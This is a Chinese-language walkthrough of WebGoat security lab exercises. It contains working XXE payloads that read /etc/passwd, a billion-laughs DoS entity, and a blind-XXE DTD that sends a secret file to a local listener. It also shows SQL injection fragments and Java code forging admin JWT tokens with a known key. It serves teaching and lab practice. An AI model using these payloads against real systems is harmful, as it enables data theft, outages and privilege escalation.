<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id, hostname, ip, mac, status, description <span class="keyword">from</span> servers  <span class="keyword">where</span> status <span class="operator">&lt;&gt;</span> <span class="string">&#x27;out of order&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> id <span class="keyword">else</span> ip <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>



<p>由于对hsqldb语法不了解，后面的注入过程无法再继续了。</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>全称XML External Entity attack，XML外部实体攻击。<br>一个XML实体允许定义标签，当解析XML文档时，标签将被内容取代。 通常有三种类型的实体：<br>* 内部实体<br>* 外部实体<br>* 参数实体。</p>
<p>一个实体必须在文档类型定义（Document Type Definition，DTD）中创建，一个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE author [</span><br><span class="line">  &lt;!ELEMENT author (#PCDATA)&gt;</span><br><span class="line">  &lt;!ENTITY js &quot;Jo Smith&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;js;&lt;/author&gt;</span><br></pre></td></tr></table></figure>

<p>在xml后面的部分里，调用实体<code>＆js</code>; 解析器将用实体中定义的值替换它。而XXE攻击就是因为实体内容可以被攻击者控制而导致的一种攻击。</p>
<blockquote>
<p>用上面的XML做一个具体解释，第一行表明该文档符合XML1.0，第二行说明该文档使用author词汇表，author是根元素。关键字SYSTEM 解析器将根据给出的URL寻找DTD，关键字PUBLIC 根据URI寻找DTD。<br>DTD的四种标记声明<br>ELEMENT xml元素类型声明<br>ATTLIST 特定元素类型可设置的属性&amp;属性的允许值声明<br>ENTITY 可重用的内容声明<br>NOTATION 不要解析的外部内容的格式声明。</p>
</blockquote>
<h4 id="Stage-3-1"><a href="#Stage-3-1" class="headerlink" title="Stage 3"></a>Stage 3</h4><p>只是最简单的一个引用外部实体，下图添加评论comment并提交后。</p>
<p>会得到下图的数据包，可以看到，评论是通过xml格式传到后台的，所以就可以进行xxe测试了。</p>
<p>按照如下数据包进行发送，就可以获取填入的文件内容。在comment字段中调用了DTD中定义的实体test，而test实体又是获取文件&#x2F;etc&#x2F;passwd的内容，由于题目并没有回显，而是同时返回包的内容来进行判断是否成功，当再次刷新页面的时候，就可以看到&#x2F;etc&#x2F;passwd的内容在评论里显示出来了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE copyright [&lt;!ENTITY test SYSTEM</span><br><span class="line">&quot;file:///etc//passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;hello&amp;test;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>




<h4 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage 4"></a>Stage 4</h4><p>和上一题目类似，不过此题目采用的传输数据包是json格式。</p>
<p>因为json的xxe攻击方式其实就是测试当HTTP头的属性<code>Content-Type: application/xml</code>是否能够正确接受，只要能够接受，就有很大概率存在xxe，从下图可以看到，该题目虽然用json能够正常传到后台，但是使用xml传输也是能够正常执行的。</p>
<p>看下源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AttackResult <span class="title function_">createNewUser</span><span class="params">(<span class="meta">@RequestBody</span> String commentStr, <span class="meta">@RequestHeader(&quot;Content-Type&quot;)</span> String contentType)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">AttackResult</span> <span class="variable">attackResult</span> <span class="operator">=</span> failed().build();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (APPLICATION_JSON_VALUE.equals(contentType)) &#123;</span><br><span class="line">        comments.parseJson(commentStr).ifPresent(c -&gt; comments.addComment(c, <span class="literal">true</span>));</span><br><span class="line">        attackResult = failed().feedback(<span class="string">&quot;xxe.content.type.feedback.json&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (MediaType.APPLICATION_XML_VALUE.equals(contentType)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Comment</span> <span class="variable">comment</span> <span class="operator">=</span> comments.parseXml(commentStr);</span><br><span class="line">            comments.addComment(comment, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (checkSolution(comment)) &#123;</span><br><span class="line">                attackResult = success().build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            error = org.apache.commons.lang.exception.ExceptionUtils.getFullStackTrace(e);</span><br><span class="line">            attackResult = failed().feedback(<span class="string">&quot;xxe.content.type.feedback.xml&quot;</span>).output(error).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> trackProgress(attackResult);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码对<code>Content-Type</code>进行了判断，然后根据不同类型来进行不同的解析操作。所以修改了HTTP包头的<code>Content-Type</code>属性后，和Stage 3的poc一样就可以xxe了。</p>
<h4 id="xxe-的-ddos"><a href="#xxe-的-ddos" class="headerlink" title="xxe 的 ddos"></a>xxe 的 ddos</h4><p>当xml中的dtd包含这样的形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line"> &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>

<p>当XML解析器加载此文档时，它会看到它包含一个根元素“lolz”，其中包含文本“＆lol9;”。 但是，“＆lol9;” 是一个定义的实体，扩展为包含十个“＆lol8;”的字符串字符串。 每个“＆lol8;” 字符串是一个定义的实体，扩展为十个“＆lol7;” 字符串等等。 所有的实体扩展都经过处理后，这个小于1KB的xml将扩展到3GB。</p>
<h4 id="盲XXE"><a href="#盲XXE" class="headerlink" title="盲XXE"></a>盲XXE</h4><p>在某些情况下，xxe没有输出，因为尽管您的攻击可能已经发挥作用，但该字段并未反映在页面的输出中。 或者您尝试读取的资源包含导致解析器失败的非法XML字符。 用Stage 7这个例子说明一下。</p>
<h4 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage 7"></a>Stage 7</h4><p>首先，我们包含一个外部dtd，叫做<code>attack.dtd</code>，此dtd我用python启动SimpleHTTPSever进行访问。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:8000/attack.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;</span><br><span class="line">  &lt;text&gt;test&amp;send;&lt;/text&gt;</span><br><span class="line">&lt;/comment&gt;</span><br></pre></td></tr></table></figure>

<p>下面就是这个<code>attack.dtd</code>的具体内容，可以看到这段xml的意思是，先访问一个secret.txt文件，将内容放在对象file中，然后将file放在链接<code>http://localhost:9090/landing?text=%file</code>中发送出去，这样，就可以把一个没有回显的xxe做到读出内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///Users/dny/.webgoat-8.0.0.M17/XXE/secret.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>具体效果如下：</p>
<h2 id="Authentication-Flaws"><a href="#Authentication-Flaws" class="headerlink" title="Authentication Flaws"></a>Authentication Flaws</h2><p>身份验证缺陷</p>
<h3 id="Authentication-Bypasses"><a href="#Authentication-Bypasses" class="headerlink" title="Authentication Bypasses"></a>Authentication Bypasses</h3><p>权限绕过</p>
<h4 id="Stage-2-1"><a href="#Stage-2-1" class="headerlink" title="Stage 2"></a>Stage 2</h4><p>本题目其实很简单，问题出在进行参数判断时，没有对参数名进行有效的处理，只判断了安全问题个数一致，就可以通过。具体代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verifyAccount</span><span class="params">(Integer userId, HashMap&lt;String,String&gt; submittedQuestions )</span> &#123;</span><br><span class="line">    <span class="comment">//short circuit if no questions are submitted</span></span><br><span class="line">    <span class="keyword">if</span> (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (submittedQuestions.containsKey(<span class="string">&quot;secQuestion0&quot;</span>) &amp;&amp; !submittedQuestions.get(<span class="string">&quot;secQuestion0&quot;</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">&quot;secQuestion0&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (submittedQuestions.containsKey(<span class="string">&quot;secQuestion1&quot;</span>) &amp;&amp; !submittedQuestions.get(<span class="string">&quot;seQuestion1&quot;</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">&quot;secQuestion1&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击截图</p>
<p>更换后</p>
<h3 id="JWT-tokens"><a href="#JWT-tokens" class="headerlink" title="JWT tokens"></a>JWT tokens</h3><p>jwt是一种防止用户修改本地存储数据的数据结构。</p>
<p>JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public&#x2F;private key pair using RSA.<br>JSON Web Token is used to carry information related to the identity and characteristics (claims) of a client. This “container” is signed by the server in order to avoid that a client tamper it in order to change, for example, the identity or any characteristics (example: change the role from simple user to admin or change the client login). This token is created during authentication (is provided in case of successful authentication) and is verified by the server before any processing. It is used by an application to allow a client to present a token representing his “identity card” (container with all user information about him) to server and allow the server to verify the validity and integrity of the token in a secure way, all of this in a stateless and portable approach (portable in the way that client and server technologies can be different including also the transport channel even if HTTP is the most often used)</p>
<p>jwt具体内容为<a href="https://jwt.io/introduction/">https://jwt.io/introduction/</a></p>
<p>一个JWT token的样式如下：</p>
<p>这个token是由<code>header.claims.signature</code>三部分组成的base64字符串，解码后样式如下:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">.</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1416471934</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;user_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;read&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;write&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;authorities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;ROLE_ADMIN&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ROLE_USER&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;client_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-client-with-secret&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">.</span><br><span class="line">qxNjYSPIKSURZEMqLQQPw1Zdk6Le2FdGHRYZG7SQnNk</span><br></pre></td></tr></table></figure>

<p>使用方式</p>
<h4 id="Stage-4-1"><a href="#Stage-4-1" class="headerlink" title="Stage 4"></a>Stage 4</h4><p>此题目的是要求使用admin权限的账户进行vote的reset操作，但是默认的几个用户都不是admin权限。</p>
<p>将jwt token进行解密</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzUxMiJ9<span class="selector-class">.eyJpYXQiOjE1Mjk1NTkzNzksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0</span><span class="selector-class">.KcvygZbm6EzDZn8_X7ppL5M6NdnNPkObZv7e-KyOKZf6Zui3-DB5ClHCLOj3dlgT6ngJHqMT0FWhP-DwQkj1og</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS512&quot;</span>&#125;.&#123;<span class="string">&quot;iat&quot;</span>:<span class="number">1529559379</span>,<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;Tom&quot;</span>&#125;.KcvygZbm6EzDZn8_X7ppL5M6NdnNPkObZv7e-KyOKZf6Zui3-DB5ClHCLOj3dlgT6ngJHqMT0FWhP-DwQkj1og</span><br></pre></td></tr></table></figure>

<p>基于此，则用下面一段代码生成一个新的jwt token，让用户为admin权限。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> dd.webgoat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTToken</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;victory&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createJWTToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setIssuedAt(Date.from(Instant.now().plus(Duration.ofDays(<span class="number">10</span>))));</span><br><span class="line">        claims.put(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;True&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder().setClaims(claims).signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, JWT_PASSWORD).compact();</span><br><span class="line">        System.out.println(token);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        JWTToken.createJWTToken();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output : eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1Mjk1NTk3MzMsImFkbWluIjoiVHJ1ZSIsInVzZXIiOiJUb20ifQ.8NbUmA9omqwnV5GwVhPep_-59Bpt5rbqVxxHgRmoeRY59brbGI002OiLmBZ9gP1J9IEhAb5cY6LYytyHzqQ_FA</span></span><br></pre></td></tr></table></figure>

<p>更改发包中的内容，即可通过此题目。</p>
<blockquote>
<p>注意，此题目生成token的代码中，需要知道jwt token生成的盐是什么值，才能够保证jwt token生成后的签名值的正确性。</p>
</blockquote>
<h4 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage 5"></a>Stage 5</h4><p>此题目和Stage 4类似，是让对一段jwt token进行解码并修改username值后再次提交，如果能够通过验证，则通过此题目。</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYW<span class="keyword">ls</span>IjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7A<span class="keyword">cd</span>Kdp_GiO7F_Ym12u-0</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;.&#123;<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;WebGoat Token Builder&quot;</span>,<span class="string">&quot;iat&quot;</span><span class="function">:1524210904</span>,<span class="string">&quot;exp&quot;</span><span class="function">:1618905304</span>,<span class="string">&quot;aud&quot;</span>:<span class="string">&quot;webgoat.org&quot;</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;tom@webgoat.com&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Tom&quot;</span>,<span class="string">&quot;Email&quot;</span>:<span class="string">&quot;tom@webgoat.com&quot;</span>,<span class="string">&quot;Role&quot;</span>:[<span class="string">&quot;Manager&quot;</span>,<span class="string">&quot;Project Administrator&quot;</span>]&#125;<span class="string">.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0</span></span><br></pre></td></tr></table></figure>

<p>直接给出代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> dd.webgoat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.List;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTSecret_S5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;victory&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createJWTToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setIssuedAt(Date.from(Instant.now().plus(Duration.ofDays(<span class="number">10</span>))));</span><br><span class="line">        claims.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;WebGoat Token Builder&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;exp&quot;</span>, <span class="number">1618905304</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;aud&quot;</span>, <span class="string">&quot;webgoat.org&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;sub&quot;</span>, <span class="string">&quot;tom@webgoat.com&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;WebGoat&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;Email&quot;</span>, <span class="string">&quot;tom@webgoat.com&quot;</span>);</span><br><span class="line">        ArrayList&lt;String&gt; roleList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        roleList.add(<span class="string">&quot;Manager&quot;</span>);</span><br><span class="line">        roleList.add(<span class="string">&quot;Project Administrator&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;Role&quot;</span>, roleList);</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder().setClaims(claims).signWith(io.jsonwebtoken.SignatureAlgorithm.HS256, JWT_PASSWORD).compact();</span><br><span class="line">        System.out.println(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        JWTSecret_S5.createJWTToken();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: eyJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1Mjk1NjA2NDEsImlzcyI6IldlYkdvYXQgVG9rZW4gQnVpbGRlciIsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.mgB3v5oGeeL7gKUctTwbZ81tTjtpX7W54EiUpDeGyMo</span></span><br></pre></td></tr></table></figure>

<p>成功通过</p>
